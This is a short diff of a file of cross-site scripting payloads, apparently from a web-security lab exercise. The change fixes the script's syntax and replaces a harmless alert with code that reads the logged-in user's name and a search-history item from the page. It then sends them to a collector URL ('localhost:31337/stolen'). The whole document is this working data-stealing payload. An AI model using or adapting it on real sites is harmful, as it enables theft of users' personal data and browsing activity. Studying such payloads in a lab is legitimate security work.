@@ -1,10 +1,10 @@
 xss_0:
 <script>
-$(document).ready(function)() {
+$( document ).ready(function() {
 name = document.getElementById("logged-in-user").innerHTML;
-search = document.getElementByClassName("history-item" "list-group-item")[0].innerHTML;
-alert(name + ", " + search);
-}
+search = document.getElementById("history-list").getElementsByClassName("list-group-item")[1].innerHTML;
+Get("https://localhost:31337/stolen?user=" + name + "&last_search=" + search);
+});
 </script>
 xss_1:
 
